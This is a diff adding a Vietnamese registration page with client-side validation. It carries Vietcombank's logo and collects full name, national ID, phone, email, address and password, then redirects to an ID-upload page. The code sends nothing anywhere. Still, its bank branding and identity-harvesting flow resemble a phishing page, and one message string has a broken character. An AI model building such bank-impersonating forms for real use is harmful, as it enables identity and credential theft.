@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Đăng ký</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://sanfactory.vn/wp-content/uploads/2023/10/logo-vietcombank-2-1400x645.png" alt="Vietcombank Logo" class="bank-logo">
+        <form autocomplete="off" id="registerForm" spellcheck="false">
+            <div class="form-group">
+                <label for="fullname">Họ và tên</label>
+                <input type="text" id="fullname" name="fullname"
+                       autocomplete="false" 
+                       spellcheck="false"
+                       readonly onfocus="this.removeAttribute('readonly');" required>
+            </div>
+            <div class="form-group">
+                <label for="idNumber">CMND/CCCD</label>
+                <input type="text" id="idNumber" name="idNumber"
+                       autocomplete="false"
+                       spellcheck="false"
+                       readonly onfocus="this.removeAttribute('readonly');" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">Số điện thoại</label>
+                <input type="tel" id="phone" name="phone"
+                       autocomplete="false"
+                       spellcheck="false"
+                       readonly onfocus="this.removeAttribute('readonly');" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email" name="email"
+                       autocomplete="false"
+                       spellcheck="false"
+                       readonly onfocus="this.removeAttribute('readonly');" required>
+            </div>
+            <div class="form-group">
+                <label for="address">Địa chỉ</label>
+                <input type="text" id="address" name="address"
+                       autocomplete="false"
+                       spellcheck="false"
+                       readonly onfocus="this.removeAttribute('readonly');" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Mật khẩu</label>
+                <input type="password" id="password" name="password"
+                       autocomplete="new-password"
+                       spellcheck="false"
+                       readonly onfocus="this.removeAttribute('readonly');" required>
+            </div>
+            <button type="submit" class="login-btn">Đăng ký</button>
+        </form>
+        <button onclick="window.location.href='login.html'" class="link-btn">
+            Đã có tài khoản? Đăng nhập
+        </button>
+    </div>
+    <script>
+        const emailInput = document.getElementById('email');
+    const emailMessageDiv = document.createElement('div');
+    emailMessageDiv.className = 'email-message';
+    emailInput.parentNode.appendChild(emailMessageDiv);
+
+    emailInput.addEventListener('input', function() {
+        const email = this.value;
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        
+        if (!emailRegex.test(email)) {
+            emailMessageDiv.textContent = 'Vui l��ng nhập email hợp lệ';
+            this.setCustomValidity('Email không hợp lệ');
+        } else {
+            emailMessageDiv.textContent = '';
+            this.setCustomValidity('');
+        }
+    });
+
+    const passwordInput = document.getElementById('password');
+    const messageDiv = document.createElement('div');
+    messageDiv.className = 'password-message';
+    passwordInput.parentNode.appendChild(messageDiv);
+
+    passwordInput.addEventListener('input', function() {
+        const password = this.value;
+        let messages = [];
+        
+        // Check minimum length
+        if (password.length < 8) {
+            messages.push('• Ít nhất 8 ký tự');
+        }
+        
+        // Check for numbers
+        if (!/\d/.test(password)) {
+            messages.push('• Ít nhất 1 số');
+        }
+        
+        // Check for uppercase
+        if (!/[A-Z]/.test(password)) {
+            messages.push('• Ít nhất 1 chữ in hoa');
+        }
+        
+        // Check for special characters
+        if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
+            messages.push('• Ít nhất 1 ký tự đặc biệt');
+        }
+
+        // Display messages with line breaks
+        if (messages.length > 0) {
+            messageDiv.textContent = messages.join('\n');
+            this.setCustomValidity('Invalid password');
+        } else {
+            messageDiv.textContent = '';
+            this.setCustomValidity('');
+        }
+    });
+
+    // Add ID number validation
+    const idInput = document.getElementById('idNumber');
+    idInput.addEventListener('input', function() {
+        const id = this.value;
+        if (!/^\d{9,12}$/.test(id)) {
+            this.setCustomValidity('CMND/CCCD phải có 9-12 số');
+        } else {
+            this.setCustomValidity('');
+        }
+    });
+
+    // Add phone validation
+    const phoneInput = document.getElementById('phone');
+    phoneInput.addEventListener('input', function() {
+        const phone = this.value;
+        if (!/^0\d{9}$/.test(phone)) {
+            this.setCustomValidity('Số điện thoại không hợp lệ');
+        } else {
+            this.setCustomValidity('');
+        }
+    });
+
+    // Update form submission handler
+    document.getElementById('registerForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const emailValid = !emailInput.validity.customError;
+        const passwordValid = !passwordInput.validity.customError;
+        
+        if (emailValid && passwordValid) {
+            alert('Đăng ký thành công!');
+            window.location.href = 'upload_id.html';
+        }
+    });
+    </script>
+</body>
+</html>
